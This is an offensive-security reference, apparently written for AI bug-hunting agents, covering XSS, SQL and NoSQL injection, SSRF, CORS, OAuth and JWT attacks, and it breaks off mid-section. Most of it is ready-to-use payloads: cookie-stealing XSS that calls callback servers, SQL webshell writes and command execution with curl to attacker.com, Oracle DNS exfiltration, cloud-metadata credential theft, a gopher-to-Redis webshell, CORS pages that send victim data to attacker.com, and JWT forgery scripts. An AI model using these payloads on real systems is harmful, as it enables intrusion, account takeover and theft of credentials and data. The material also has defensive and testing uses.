# Modern Bug Classes: Detection & Exploitation Reference

> **Document Version**: 2025.1 | **Purpose**: Comprehensive vulnerability class reference for AI hunting agents
>
> Each section covers detection techniques, exploitation methods, payload libraries, and chaining strategies.

---

## Table of Contents

1. [Cross-Site Scripting (XSS)](#1-cross-site-scripting-xss)
2. [SQL Injection](#2-sql-injection)
3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf)
4. [Cross-Origin Resource Sharing (CORS)](#4-cross-origin-resource-sharing-cors)
5. [Authentication & Session Management](#5-authentication--session-management)
6. [Authorization & Access Control](#6-authorization--access-control)
7. [Prototype Pollution](#7-prototype-pollution)
8. [XML & File Parsing](#8-xml--file-parsing)
9. [Infrastructure & Cloud](#9-infrastructure--cloud)
10. [Business Logic](#10-business-logic)

---

## 1. Cross-Site Scripting (XSS)

### 1.1 XSS Taxonomy

| Type | Persistence | User Interaction | Detection Difficulty |
|------|------------|------------------|---------------------|
| **Reflected** | None | Required (click link) | Easy |
| **Stored** | Persistent | None/Minimal | Medium |
| **DOM-based** | None/Stored | Varies | Hard |
| **Self-XSS** | None | Self-inflicted | N/A (requires chain) |
| **Blind XSS** | Persistent | Delayed | Very Hard |
| **Mutation XSS** | Varies | Varies | Very Hard |

### 1.2 Context Analysis Framework

#### HTML Context

```html
<!-- Injection point: <div>[USER_INPUT]</div> -->
<!-- Detection: -->
<xss_test>

<!-- Exploitation vectors: -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>
<object data=javascript:alert(document.domain)>
<embed src=javascript:alert(document.domain)>

<!-- HTML5-specific tags: -->
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video src=x onerror=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
<meter onforminput=alert(document.domain)>

<!-- Math/SVG foreignObject chains: -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style>
```

#### Attribute Context

```html
<!-- Injection point: <input value="[USER_INPUT]"> -->
<!-- Detection: -->
" xss_test

<!-- Without quotes (value=[USER_INPUT]): -->
<img src=x onerror=alert(1)>

<!-- With double quotes: -->
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) x="
" onerror=alert(1) src=x x="

<!-- With single quotes: -->
' onfocus=alert(1) autofocus x='
' onmouseover=alert(1) x='

<!-- href/src attribute context: -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- style attribute context: -->
expression(alert(1))
-moz-binding(url(//attacker.com/xss.xml#xss))
```

#### JavaScript Context

```javascript
// Injection point: <script>var data = '[USER_INPUT]';</script>
// Detection:
';alert('xss');//

// Single-quoted string:
';alert(document.domain);//
\';alert(document.domain);//!

// Double-quoted string:
";alert(document.domain);//
\";alert(document.domain);//!

// Template literal context:
${alert(document.domain)}
${process.mainModule.require('child_process').exec('id')}

// Object property context:
'-alert(document.domain)-'
'};alert(document.domain);{'

// Arrow function / constructor chains:
[].constructor.constructor`alert(1)`
[].constructor.constructor`alert\x28document.domain\x29`

// Unicode escape sequences:
\u0027;alert(1)\u002f\u002f
\x27;alert(1)\x2f\x2f
\47;alert(1)//
```

#### URL Context

```javascript
// Injection point: <a href="[USER_INPUT]">
javascript:alert(1)
javascript://%0aalert(1)
javascript://target.com%0aalert(1)
data:text/html,<script>alert(1)</script>

// Protocol-relative:
//evil.com/xss.js

// Path-relative (when base URL is target):
/path/to/page#javascript:alert(1)
```

#### CSS Context

```css
/* Injection point: <style>.class { color: [USER_INPUT]; }</style> */
</style><script>alert(1)</script><style>

/* Injection point: <div style="[USER_INPUT]"> */
expression(alert(1))
-moz-binding(url(//attacker.com/xss.xml#xss))
</style><img src=x onerror=alert(1)><style>
```

### 1.3 Advanced XSS Techniques

#### Template Injection to XSS

```javascript
// AngularJS (1.x)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// Vue.js
{{constructor.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}

// React (dangerouslySetInnerHTML)
// If user input reaches dangerouslySetInnerHTML:
// <div dangerouslySetInnerHTML={{__html: userInput}} />

// Mithril.js
{m: console.log(1)}

// Ractive.js
{{#exec}}alert(1){{/exec}}
```

#### DOMPurify Bypass Techniques

```javascript
// DOMPurify bypass via namespace confusion (CVE-2020-26870)
<svg><p><style><!--</style><img src=x onerror=alert(1)>--></style>

// DOMPurify bypass via math namespace
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style>

// DOMPurify + marked.js bypass
<svg><p><style><!--</style><img src=x onerror=alert(1)>--></style></p></svg>

// DOMPurify bypass via clobbering (DOM Clobbering)
// Requires specific HTML structure:
<form id="document"><input name="location"></form>
// Can shadow document.location in some contexts

// DOMPurify 2.0.17 bypass (prototype pollution required)
// Pollute: ALLOWED_ATTR to include onerror, onload, etc.
// Then standard payload works
```

#### Prototype Pollution to XSS Chains

```javascript
// Step 1: Pollute Object.prototype
// POST /api/preferences
// {"__proto__": {"isAdmin": true}}

// Step 2: Pollute DOMPurify configuration
// POST /api/preferences
// {"__proto__": {"ALLOWED_ATTR": ["onerror", "onload", "src"]}}

// Step 3: Submit payload through DOMPurify
// <img src=x onerror=alert(document.cookie)>
// Now allowed because prototype was polluted
```

### 1.4 Blind XSS Detection

```javascript
// Blind XSS payloads (use callback server)
<script src="https://your-burpcollaborator.net/blind-xss"></script>
<img src=x onerror="fetch('https://your-burpcollaborator.net/?c='+document.cookie)">

// XSS Hunter payloads
<script src="https://xsshunter.your-domain.com"></script>

// Blind XSS in log viewers, admin panels, export features:
<script>fetch('//your-server.com/?c='+btoa(document.cookie))</script>

// For PDF generation (wkhtmltopdf, weasyprint):
<script>document.location='https://your-server.com/?c='+document.cookie</script>

// For email clients:
<img src="https://your-server.com/?c=xss" onerror="this.src='https://your-server.com/?c='+document.cookie">
```

### 1.5 XSS WAF Bypass - 5-Rotor Mutation

```javascript
// === ROTOR 1: Case & Encoding ===
// Standard: <script>alert(1)</script>
// Rotor 1: <ScRiPt>alert(1)</ScRiPt>
<Img Src=x OnError=alert(1)>
<Svg OnLoad=alert(1)>

// === ROTOR 2: Whitespace Injection ===
// Insert encoded whitespace between tokens
<svg%0aonload=alert(1)>
<svg%09onload=alert(1)>
<svg%0donload=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>

// === ROTOR 3: Attribute Splitting ===
<img src=x onerror="alert(1)">
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror="alert&#x28;1&#x29;">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

// === ROTOR 4: Protocol & Encoding Obfuscation ===
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>
<script>[][\x22\x66\x69\x6c\x74\x65\x72\x22][\x22\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x22](\x22\x72\x65\x74\x75\x72\x6e\x20\x61\x6c\x65\x72\x74\x28\x31\x29\x22)()</script>

// === ROTOR 5: Context-Specific Mutation ===
// For innerHTML sinks:
<img src=x onerror=alert(1)>

// For document.write sinks:
<script>document.write('<img src=x onerror=alert(1)>')</script>

// For eval() sinks:
alert(1)
Function('alert(1)')()
constructor.constructor('alert(1)')()

// For setTimeout/setInterval:
setTimeout('alert(1)', 0)
setTimeout(alert, 0, 1)

// For location.href:
javascript:alert(1)
javascript://%0d%0aalert(1)
javascript://target.com%0aalert(1)
```

### 1.6 XSS in Modern Frameworks

```javascript
// React XSS vectors
// 1. dangerouslySetInnerHTML
// 2. href/javascript: URLs in links
// 3. user-provided URLs in <a> tags without validation

// Angular XSS (modern versions with strict CSP)
// Bypass via trusted types:
// If application bypasses Angular sanitization:
// constructor parameter injection

// Vue.js XSS
// v-html directive (unsanitized)
// <div v-html="userInput"></div>

// Svelte {@html userInput}
// This is unsanitized - direct XSS

// Next.js / Nuxt.js
// SSR context injection
// __NEXT_DATA__ pollution
```

---

## 2. SQL Injection

### 2.1 SQLi Detection Techniques

#### Error-Based Detection

```sql
-- Trigger syntax errors
'"`\ OR 1=1 --
' AND 1=1 --
' AND 1=2 --
' UNION SELECT NULL --

-- Common error signatures:
-- MySQL: "You have an error in your SQL syntax"
-- PostgreSQL: "ERROR: syntax error at or near"
-- MSSQL: "Unclosed quotation mark"
-- Oracle: "ORA-00933: SQL command not properly ended"
-- SQLite: "near \"X\": syntax error"
```

#### Boolean-Based Blind Detection

```sql
-- True condition: original response
?id=1 AND 1=1 --

-- False condition: different response
?id=1 AND 1=2 --

-- String comparison test
?id=1 AND 'a'='a' --
?id=1 AND 'a'='b' --

-- Length-based extraction
?id=1 AND LENGTH((SELECT password FROM users LIMIT 1)) > 5 --
?id=1 AND LENGTH((SELECT password FROM users LIMIT 1)) > 10 --

-- Substring extraction
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a' --
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'b' --
```

#### Time-Based Blind Detection

```sql
-- MySQL time delay
?id=1 AND IF(1=1, SLEEP(5), 0) --
?id=1 AND IF(LENGTH((SELECT password FROM users LIMIT 1)) > 5, SLEEP(5), 0) --

-- PostgreSQL time delay
?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
?id=1 AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users LIMIT 1)) > 5) THEN pg_sleep(5) ELSE pg_sleep(0) END) --

-- MSSQL time delay
?id=1; IF (1=1) WAITFOR DELAY '0:0:5' --
?id=1; IF (LEN((SELECT TOP 1 password FROM users)) > 5) WAITFOR DELAY '0:0:5' --

-- Oracle time delay
?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
?id=1 AND 1=(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE ROWNUM=1)) > 5) THEN DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) ELSE 1 END FROM DUAL) --

-- SQLite time delay (limited - use recursive CTE)
?id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 1 END) --
```

#### Union-Based Extraction

```sql
-- Step 1: Determine column count
?id=1 ORDER BY 1 --
?id=1 ORDER BY 2 --
?id=1 ORDER BY 3 --  (error here = 2 columns)

-- Alternative: UNION NULL
?id=1 UNION SELECT NULL --
?id=1 UNION SELECT NULL, NULL --
?id=1 UNION SELECT NULL, NULL, NULL --

-- Step 2: Determine injectable columns (data types)
?id=1 UNION SELECT 'test', NULL, NULL --
?id=1 UNION SELECT NULL, 'test', NULL --
?id=1 UNION SELECT NULL, NULL, 'test' --

-- Step 3: Extract data
-- MySQL:
?id=1 UNION SELECT NULL, version(), user() --
?id=1 UNION SELECT NULL, database(), @@datadir --

-- PostgreSQL:
?id=1 UNION SELECT NULL, version(), current_user --
?id=1 UNION SELECT NULL, current_database(), session_user --

-- MSSQL:
?id=1 UNION SELECT NULL, @@version, SYSTEM_USER --
?id=1 UNION SELECT NULL, DB_NAME(), CURRENT_USER --

-- Oracle:
?id=1 UNION SELECT NULL, (SELECT banner FROM v$version WHERE ROWNUM=1), (SELECT user FROM dual) --
```

### 2.2 Database-Specific Exploitation

#### MySQL / MariaDB

```sql
-- Read files
?id=1 UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL --

-- Write files
?id=1 UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php' --

-- MySQL 5.7+ JSON features
?id=1 UNION SELECT NULL, JSON_OBJECT('user', user()), NULL --

-- Information schema queries
?id=1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns WHERE table_schema=database() --

-- MySQL stacked queries (when supported)
?id=1; DROP TABLE users; --
?id=1; INSERT INTO users (username, password) VALUES ('backdoor', 'password'); --
```

#### PostgreSQL

```sql
-- Read files
copy (select '') to program 'cat /etc/passwd'

-- RCE via COPY TO PROGRAM (PostgreSQL 9.3+)
?id=1; COPY (SELECT '') TO PROGRAM 'id' --
?id=1; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)' --

-- Alternative RCE
CREATE OR REPLACE FUNCTION system(text) RETURNS text AS '
  import os
  return os.popen(args[0]).read()
' LANGUAGE plpythonu;

-- Table extraction
?id=1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --

-- Current queries
?id=1 UNION SELECT NULL, query, NULL FROM pg_stat_activity --
```

#### MSSQL

```sql
-- Enable xp_cmdshell
?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

-- Execute commands
?id=1; EXEC xp_cmdshell 'whoami' --
?id=1; EXEC xp_cmdshell 'powershell -enc [base64]' --

-- Alternative: sp_oamethod
?id=1; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami' --

-- Read registry
?id=1 UNION SELECT NULL, value, NULL FROM master.dbo.fn_regread('HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName', 'ComputerName') --

-- Linked server enumeration
?id=1 UNION SELECT NULL, srvname, NULL FROM master.dbo.sysservers --
```

#### Oracle

```sql
-- Error-based data extraction
?id=1 AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --
?id=1 AND 1=utl_inaddr.get_host_name((SELECT password FROM users WHERE ROWNUM=1)) --

-- DNS exfiltration
?id=1 AND (SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual) IS NOT NULL --

-- Read files (Oracle 11g+)
?id=1 AND (SELECT XMLTYPE((SELECT EXTRACTVALUE(XMLTYPE(DBMS_XMLGEN.GETXMLTYPE('SELECT TEXT FROM (SELECT /*+ optimizer_features_enable(''11.2.0.4''') */ TEXT FROM DUAL)').GETCLOBVAL()),'/ROWSET/ROW/TEXT') FROM DUAL)) FROM DUAL) IS NOT NULL --

-- Table extraction
?id=1 UNION SELECT NULL, table_name, column_name FROM all_tab_columns --
```

### 2.3 NoSQL Injection

#### MongoDB Injection

```javascript
// Detection: modify query structure
// Original: {"username": "admin", "password": "password"}

// Login bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": "^.*"}}

// Extract data character by character
{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}

// NoSQL time-based (MongoDB 4.2+)
{"$where": "sleep(5000) || true"}
{"$where": "function() { var d = new Date(); do { var c = new Date(); } while (c - d < 5000); return true; }"}

// JavaScript injection in $where
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}

// NoSQL in URL parameters
?username[$ne]=admin&password[$ne]=invalid
?username[$regex]=^admin&password[$exists]=true
?username[$in][]=admin&username[$in][]=moderator

// NoSQL in JSON body
POST /api/login
Content-Type: application/json

{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

#### Elasticsearch Injection

```json
// Query DSL injection
{
  "query": {
    "match": {
      "username": {
        "query": "admin",
        "fuzziness": "AUTO"
      }
    }
  }
}

// Script injection (if scripting enabled)
{
  "query": {
    "script": {
      "script": {
        "source": "doc['username'].value == 'admin'"
      }
    }
  }
}

// Remote code execution via script
{
  "script_fields": {
    "test": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"
    }
  }
}
```

### 2.4 ORM-Specific Injection

#### Django ORM Injection

```python
# Vulnerable: raw() and extra()
User.objects.raw("SELECT * FROM users WHERE username = '%s'" % username)
User.objects.extra(where=["username = '%s'" % username])

# Injection via ORM methods
# filter() with user-controlled field names
User.objects.filter(**{user_controlled_field: "value"})

# order_by() injection
User.objects.all().order_by(user_controlled_column)
# Payload: "- (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
```

#### Hibernate/JPA Injection

```java
// Vulnerable: native queries
entityManager.createNativeQuery("SELECT * FROM users WHERE username = '" + username + "'");

// HQL injection
// Vulnerable:
Query q = session.createQuery("FROM Users WHERE username = '" + username + "'");

// HQL does not support UNION but supports:
// - SUBSTRING, ASCII, LENGTH for blind extraction
// - FROM Users u WHERE u.id=1 AND SUBSTRING(u.password,1,1)='a'
```

### 2.5 Second-Order SQL Injection

```sql
-- Step 1: Inject payload into stored data
-- Registration: username = "admin' AND 1=1--"
-- This is safely stored (parameterized in INSERT)

-- Step 2: Trigger the injection when data is used
-- Login with username "admin' AND 1=1--"
-- Query becomes: SELECT * FROM users WHERE username = 'admin' AND 1=1--' AND password = '...'

-- Common trigger points:
-- - Password change (uses username from session)
-- - Profile display
-- - Admin user management
-- - Report generation
-- - Email notifications
-- - Audit log queries

-- Test vectors for second-order:
-- 1. Register with: username = "test'||(SELECT version())||'"
-- 2. Login and trigger profile view
-- 3. Observe if SQL error or data exfiltration occurs
```

---

## 3. Server-Side Request Forgery (SSRF)

### 3.1 SSRF Attack Types

| Type | Description | Detection Method |
|------|-------------|-----------------|
| **Basic SSRF** | Direct response from internal URL | Change URL parameter to internal address |
| **Blind SSRF** | No direct response, side effects only | Out-of-band callbacks (DNS, HTTP) |
| **Semi-Blind SSRF** | Partial response or error messages | Error-based detection |
| **Cloud SSRF** | Access to cloud metadata services | 169.254.169.254 responses |

### 3.2 SSRF Detection Techniques

```bash
# Basic detection - change external URL to internal
curl "https://target.com/fetch?url=http://169.254.169.254/"

# DNS-based out-of-band detection
curl "https://target.com/fetch?url=http://YOUR-BURP-COLLABORATOR.net"

# Different response for internal vs external
# Internal: may return different error or content
# External: connection timeout or different error

# SSRF via different protocols
curl "https://target.com/fetch?url=file:///etc/passwd"
curl "https://target.com/fetch?url=dict://127.0.0.1:11211/"
curl "https://target.com/fetch?url=gopher://127.0.0.1:9000/"
```

### 3.3 Cloud Metadata Exploitation

#### AWS Metadata Service

```bash
# IMDSv1 (older, easier to exploit)
curl "http://169.254.169.254/latest/meta-data/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

# IMDSv2 (requires token)
# Step 1: Get token
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: Use token
curl "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: TOKEN"

# SSRF bypass for IMDSv2 via headers:
# If the SSRF endpoint forwards headers:
# Set X-aws-ec2-metadata-token in original request

# User-data (may contain bootstrap scripts with secrets)
curl "http://169.254.169.254/latest/user-data"

# Identity document
curl "http://169.254.169.254/latest/dynamic/instance-identity/document"
```

#### GCP Metadata Service

```bash
# GCP metadata (requires Metadata-Flavor header)
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# Service account tokens
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Project info
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"
```

#### Azure Metadata Service

```bash
# Azure Instance Metadata Service
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# Azure Managed Identity token
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

### 3.4 Protocol Smuggling

#### Gopher Protocol

```bash
# Gopher to attack internal services
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%00%00

# Gopher for Redis
# FLUSHALL + config set dir /var/www/html + config set dbfilename shell.php + set payload "<?php system($_GET['cmd']);?>" + save
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22%0D%0ASAVE%0D%0A

# Gopher for SMTP (send email from internal)
gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cadmin%40target.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0D%0ADATA%0D%0AFrom%3A%20admin%40target.com%0D%0ATo%3A%20victim%40target.com%0D%0ASubject%3A%20Test%0D%0A%0D%0ATest%20message%0D%0A.%0D%0AQUIT%0D%0A
```

#### File Protocol

```bash
# Read local files
file:///etc/passwd
file:///windows/win.ini
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd/application.py
file:///proc/self/fd/0
file:///proc/self/fd/1
file:///proc/self/fd/2
```

#### Dict Protocol

```bash
# Dict for port scanning
dict://127.0.0.1:22/
dict://127.0.0.1:3306/
dict://127.0.0.1:6379/

# Dict for service fingerprinting
dict://127.0.0.1:11211/stats
```

#### LDAP Protocol

```bash
# LDAP injection via SSRF
ldap://127.0.0.1:389/dc=target,dc=com
ldap://127.0.0.1:389/%28%26%28objectClass=*%29%29
```

### 3.5 SSRF Bypass Techniques

```bash
# IP encoding bypasses
http://2130706433/           # 127.0.0.1 in decimal
http://0177.0.0.1/           # Octal
http://0x7f.0x0.0x0.0x1/     # Hex
http://017700000001/         # Full octal
http://0x7f000001/           # Full hex
http://127.1/                # Shortened
http://127.0.1/              # Shortened

# DNS-based bypass
http://spoofed.burpcollaborator.net/  # Points to 127.0.0.1
http://xip.io/127.0.0.1/            # xip.io wildcard DNS
http://127.0.0.1.nip.io/            # nip.io wildcard DNS

# Redirect-based bypass
# Host attacker.com that redirects to 127.0.0.1
curl -L "http://attacker.com/redirect-to-internal"

# IPv6 bypass
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# CIDR confusion
http://127.0.0.2/
http://127.1.1.1/
http://127.255.255.255/

# Protocol-relative URL
//127.0.0.1/
//169.254.169.254/

# URL parsing inconsistency
http://127.0.0.1%00target.com/
http://127.0.0.1?target.com/
http://127.0.0.1#target.com/
http://target.com@127.0.0.1/
http://target.com.127.0.0.1/
```

### 3.6 DNS Rebinding for SSRF

```
Step 1: Register a domain with short TTL (1 second)
Step 2: First DNS query returns external IP (bypasses validation)
Step 3: Validation passes (looks like external URL)
Step 4: Second DNS query returns internal IP (127.0.0.1)
Step 5: Server fetches from internal IP

Tools:
- singularity.sh (DNS rebinding toolkit)
- Custom DNS server with toggling responses

Detection:
- Look for DNS resolution happening twice
- First: external IP, Second: internal IP
```

---

## 4. Cross-Origin Resource Sharing (CORS)

### 4.1 Three-Part Test for Exploitable CORS

```javascript
// === TEST 1: Does the server reflect arbitrary origins? ===
// Send request with Origin: https://evil.com
GET /api/sensitive-data HTTP/1.1
Host: target.com
Origin: https://evil.com

// Vulnerable response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

// === TEST 2: Is the Access-Control-Allow-Credentials header present? ===
// If true, cookies will be sent with cross-origin requests

// === TEST 3: Can we actually exploit it from a browser? ===
// Exploit page hosted on https://evil.com:
<script>
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
});
</script>
```

### 4.2 CORS Misconfiguration Types

| Type | Configuration | Exploitable? |
|------|--------------|-------------|
| **Wildcard with credentials** | `Access-Control-Allow-Origin: *` + `Credentials: true` | YES - High |
| **Dynamic origin reflection** | Reflects any origin | YES - Critical |
| **Null origin allowed** | `Access-Control-Allow-Origin: null` | YES - High |
| **Subdomain trust** | `*.target.com` | Maybe - if XSS on subdomain |
| **Weak regex matching** | `/.*target\.com/` | YES - High |
| **Preflight bypass** | Complex requests without preflight | Maybe |

### 4.3 Preflight Bypass Techniques

```javascript
// Standard preflight flow:
// 1. Browser sends OPTIONS request
// 2. Server responds with allowed origins/methods/headers
// 3. Browser sends actual request

// Bypass 1: Use simple request (no preflight needed)
// Simple requests: GET, HEAD, POST with specific content-types
// Content-Types that don't trigger preflight:
// - application/x-www-form-urlencoded
// - multipart/form-data
// - text/plain

// Bypass 2: Custom headers might not trigger preflight if allowed
fetch('https://target.com/api/data', {
  method: 'POST',
  headers: {'Content-Type': 'text/plain'},  // Simple request
  body: JSON.stringify({malicious: 'data'})
});

// Bypass 3: XHR withCredentials
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/data', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://attacker.com/steal?d=' + btoa(xhr.responseText));
};
xhr.send();
```

### 4.4 Null Origin Exploitation

```javascript
// If server responds with:
// Access-Control-Allow-Origin: null
// Access-Control-Allow-Credentials: true

// Exploit via iframe sandbox:
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/data', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/?c=' + btoa(d)));
  </script>
"></iframe>

// The sandboxed iframe has origin "null"
// Server accepts null origin with credentials
// Cookies are sent with the request
```

### 4.5 SameSite=None Analysis

```javascript
// When cookies have SameSite=None, they are sent cross-origin
// This makes CORS vulnerabilities more dangerous

// Check cookie attributes:
// Set-Cookie: session=abc; SameSite=None; Secure
// Set-Cookie: session=abc; SameSite=Lax
// Set-Cookie: session=abc; SameSite=Strict

// SameSite=None + CORS misconfiguration = Full account takeover
// Attacker can:
// 1. Load target.com in iframe
// 2. CORS request includes cookies (SameSite=None)
// 3. Steal session token via CORS response
// 4. Hijack account
```

---

## 5. Authentication & Session Management

### 5.1 OAuth/OIDC Attack Chains

#### Authorization Code Flow Attacks

```bash
# === Attack 1: Missing state parameter CSRF ===
# Vulnerable authorization URL:
https://provider.com/oauth/authorize?client_id=CLIENT&redirect_uri=URI&response_type=code

# Attack: Force victim to link attacker's account
# 1. Attacker starts OAuth flow, gets code
# 2. Attacker crafts link with their code
# 3. Victim clicks link, attacker's account linked to victim's profile

# === Attack 2: Redirect URI manipulation ===
# Vulnerable: partial URI matching
curl "https://provider.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback.attacker.com&response_type=code"

# Open redirect chain:
curl "https://provider.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback?next=https://attacker.com&response_type=code"

# === Attack 3: PKCE downgrade ===
# If PKCE is optional:
# 1. Remove code_challenge parameter
# 2. Authorization still succeeds
# 3. Attacker can intercept and use code

# === Attack 4: Code interception ===
# If redirect URI has open redirect:
# 1. Set redirect_uri to target.com/callback?next=attacker.com
# 2. Code gets sent to attacker.com

# === Attack 5: Token substitution ===
# If server doesn't validate code-client_id mapping:
# 1. Get code for Client A (public client)
# 2. Redeem with Client B's credentials (confidential client)
# 3. Access Client B's scopes
```

#### Implicit Flow Attacks

```javascript
// Fragment injection via open redirect
// 1. OAuth flow redirects to:
//    https://target.com/callback#access_token=TOKEN
// 2. If callback has open redirect:
//    https://target.com/callback?next=https://attacker.com#access_token=TOKEN
// 3. Browser follows redirect with fragment:
//    https://attacker.com#access_token=TOKEN
// 4. Attacker reads fragment via JavaScript

// Exploit page on attacker.com:
<script>
var token = location.hash.split('access_token=')[1];
fetch('https://attacker.com/steal?token=' + token);
</script>
```

### 5.2 JWT Attacks

#### Algorithm Confusion (alg: none)

```python
import base64
import json

# Attack: Change algorithm to "none"
header = base64.urlsafe_b64encode(json.dumps({
    "alg": "none",
    "typ": "JWT"
}).encode()).decode().rstrip('=')

payload = base64.urlsafe_b64encode(json.dumps({
    "user": "admin",
    "role": "administrator"
}).encode()).decode().rstrip('=')

# Token with alg:none (no signature needed)
token = f"{header}.{payload}."
print(token)
```

#### Algorithm Confusion (RS256 -> HS256)

```python
import jwt
import base64

# If server uses RS256 (public/private key)
# But we can force HS256 (shared secret)

# Get the public key (often exposed as JWKS)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Sign with public key as HMAC secret
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    key=public_key,  # Using public key as HMAC secret!
    algorithm="HS256"
)
print(token)
```

#### KID (Key ID) Header Manipulation

```json
// Vulnerable: server uses kid to select key file
// If kid is user-controlled:

// Header:
{
  "alg": "HS256",
  "kid": "../../dev/null"
}

// If server does: key = read_file("/keys/" + kid)
// Then ../../dev/null reads as empty string
// Sign with empty key: HMAC with ""

// Or:
{
  "alg": "HS256",
  "kid": "../../../etc/passwd"
}
// Server reads /etc/passwd and uses first line as key
```

#### JWT Key Injection (JWK)

```python
import jwt
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Generate our own key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Serialize public key to JWK format
jwk = {
    "kty": "RSA",
    "kid": "attacker-key",
    "n": base64_urlsafe_encode(public_key.public_numbers().n.to_bytes(256, 'big')),
    "e": base64_urlsafe_encode(public_key.public_numbers().e.to_bytes(3, 'big'))
}

# Craft token with embedded JWK
